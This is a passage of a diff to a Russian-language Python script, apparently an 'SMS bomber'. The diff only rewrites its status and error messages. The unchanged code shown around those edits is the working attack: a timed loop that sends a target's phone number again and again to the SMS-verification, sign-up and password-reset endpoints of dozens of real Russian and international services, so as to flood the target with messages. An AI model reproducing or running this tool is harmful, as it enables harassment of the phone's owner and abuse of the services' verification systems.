             print('[+] MVIDEO отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
@@ -6133,10 +6133,10 @@ if call == str(2):
             print('[+] newnext отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
@@ -6144,10 +6144,10 @@ if call == str(2):
             print('[+] Sunlight отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
@@ -6157,10 +6157,10 @@ if call == str(2):
             print('[+] alpari отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
@@ -6168,10 +6168,10 @@ if call == str(2):
             print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://online.sbis.ru/reg/service/',
@@ -6181,10 +6181,10 @@ if call == str(2):
             print('[+] Sberbank отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
@@ -6196,10 +6196,10 @@ if call == str(2):
             print('[+] Psbank отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
@@ -6207,10 +6207,10 @@ if call == str(2):
             print('[+] Beltelcom отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
@@ -6218,10 +6218,10 @@ if call == str(2):
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
@@ -6229,10 +6229,10 @@ if call == str(2):
             print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
@@ -6240,10 +6240,10 @@ if call == str(2):
             print('[+] Yandex.Chef отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
@@ -6252,10 +6252,10 @@ if call == str(2):
             print('[+] MTS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.delitime.ru/api/v2/signup",
@@ -6264,14 +6264,14 @@ if call == str(2):
             print('[+] Delitime отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://guru.taxi/api/v1/driver/session/verify",
@@ -6280,10 +6280,10 @@ if call == str(2):
             print('[+] Guru отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
@@ -6293,10 +6293,10 @@ if call == str(2):
             print('[+] ICQ отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
@@ -6306,10 +6306,10 @@ if call == str(2):
             print('[+] InDriver отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
@@ -6318,10 +6318,10 @@ if call == str(2):
             print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
@@ -6329,10 +6329,10 @@ if call == str(2):
             print('[+] Pmsm отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
@@ -6340,10 +6340,10 @@ if call == str(2):
             print('[+] IVI отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
@@ -6351,10 +6351,10 @@ if call == str(2):
             print('[+] Lenta отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cloud.mail.ru/api/v2/notify/applink',
@@ -6363,10 +6363,10 @@ if call == str(2):
             print('[+] Mail.ru отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
@@ -6376,10 +6376,10 @@ if call == str(2):
             print('[+] MVideo отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
@@ -6388,10 +6388,10 @@ if call == str(2):
             print('[+] OK отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
@@ -6399,10 +6399,10 @@ if call == str(2):
             print('[+] qlean отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://sso.cloud.qlean.ru/http/users/requestotp',
@@ -6412,10 +6412,10 @@ if call == str(2):
             print('[+] Qlean отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
@@ -6423,10 +6423,10 @@ if call == str(2):
             print('[+] SMSgorod отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
@@ -6434,21 +6434,21 @@ if call == str(2):
             R = R + 1
             print('[+] Tinder отправлено! || Кол-во - ' + str(R))
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
             R = R + 1
             print('[+] BelkaCar отправлено|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
@@ -6456,55 +6456,55 @@ if call == str(2):
             R = R + 1
             print('[+] Tinder отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
             R = R + 1
             print('[+] Karusel отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
             R = R + 1
             print('[+] Tinkoff отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
             R = R + 1
             print('[+] MTS отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
             R = R + 1
             print('[+] Youla отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://pizzahut.ru/account/password-reset',
@@ -6513,22 +6513,22 @@ if call == str(2):
             R = R + 1
             print('[+] PizzaHut отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
             R = R + 1
             print('[+] Rabota отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
@@ -6540,7 +6540,7 @@ if call == str(2):
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
@@ -6548,11 +6548,11 @@ if call == str(2):
             R = R + 1
             print('[+] Smsint отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get(
@@ -6560,11 +6560,11 @@ if call == str(2):
             R = R + 1
             print('[+] oyorooms отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post(
@@ -6575,11 +6575,11 @@ if call == str(2):
             R = R + 1
             print('[+] MVideo отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
@@ -6588,22 +6588,22 @@ if call == str(2):
             R = R + 1
             print('[+] newnext отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
             R = R + 1
             print('[+] Sunlight отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
@@ -6612,22 +6612,22 @@ if call == str(2):
             R = R + 1
             print('[+] alpari отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
             R = R + 1
             print('[+] Invitro отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://online.sbis.ru/reg/service/',
@@ -6636,11 +6636,11 @@ if call == str(2):
             R = R + 1
             print('[+] Sberbank отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
@@ -6652,44 +6652,44 @@ if call == str(2):
             R = R + 1
             print('[+] Psbank отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
             R = R + 1
             print('[+] Beltelcom отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
             R = R + 1
             print('[+] Karusel отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
             R = R + 1
             print('[+] KFC отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.carsmile.com/",
@@ -6698,22 +6698,22 @@ if call == str(2):
             R = R + 1
             print('[+] carsmile отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
             R = R + 1
             print('[+] Citilink отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.delitime.ru/api/v2/signup",
@@ -6721,11 +6721,11 @@ if call == str(2):
             R = R + 1
             print('[+] Delitime отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://guru.taxi/api/v1/driver/session/verify",
@@ -6733,11 +6733,11 @@ if call == str(2):
             R = R + 1
             print('[+] Guru отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
@@ -6746,11 +6746,11 @@ if call == str(2):
             R = R + 1
             print('[+] ICQ отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
@@ -6759,11 +6759,11 @@ if call == str(2):
             R = R + 1
             print('[+] InDriver отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
@@ -6771,33 +6771,33 @@ if call == str(2):
             R = R + 1
             print('[+] Invitro отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
             R = R + 1
             print('[+] Pmsm отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
             R = R + 1
             print('[+] IVI отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',
@@ -6805,11 +6805,11 @@ if call == str(2):
             R = R + 1
             print('[+] Lenta отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cloud.mail.ru/api/v2/notify/applink',
@@ -6817,11 +6817,11 @@ if call == str(2):
             R = R + 1
             print('[+] Mail.ru отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
@@ -6830,11 +6830,11 @@ if call == str(2):
             R = R + 1
             print('[+] MVideo отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
@@ -6842,44 +6842,44 @@ if call == str(2):
             R = R + 1
             print('[+] OK отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://plink.tech/register/', json={"phone": _phone})
             R = R + 1
             print('[+] Plink отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
